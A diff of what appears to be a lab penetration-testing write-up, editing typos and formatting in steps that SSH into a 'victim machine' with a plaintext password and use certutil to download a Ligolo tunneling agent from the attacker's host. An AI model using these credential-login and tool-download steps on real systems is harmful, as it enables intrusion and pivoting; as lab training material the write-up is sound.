@@ -43,8 +43,7 @@ This was an fun lab, I need more practice with setting up and using logolo tunne
 ![](Screenshot%202026-04-07%20at%2015.30.10.png)
 
 ![](Screenshot%202026-04-05%20at%2011.11.56.png)
-
-Here is had to look up what to do, I tried for a couple of hours but never wouldh ave guessed to use a PUT request. Maybe if had used caido to run an active scan.
+At this point I checked a guide. I wouild have neve guessed to use a PUT request. Maybe if had used caido to run an active scan.
 
 ![](Screenshot%202026-04-07%20at%2015.40.34.png)
 
@@ -113,9 +112,9 @@ Ligolo-ng:
 SSH in to the machine using ariah's credentials.
 
 `ssh ariah@192.168.156.99`  
-password:NowiseSloopTheory139
+password:`NowiseSloopTheory139`
 
-create a temp folder cd into it and move a ligolo agent onto the victim machine:
+Create a temp folder, cd into it and move a ligolo agent onto the victim machine:
 
 `mkdir C:\temp`  
 `certutil -f -urlcache http://192.168.45.173/agent.exe agent.exe`
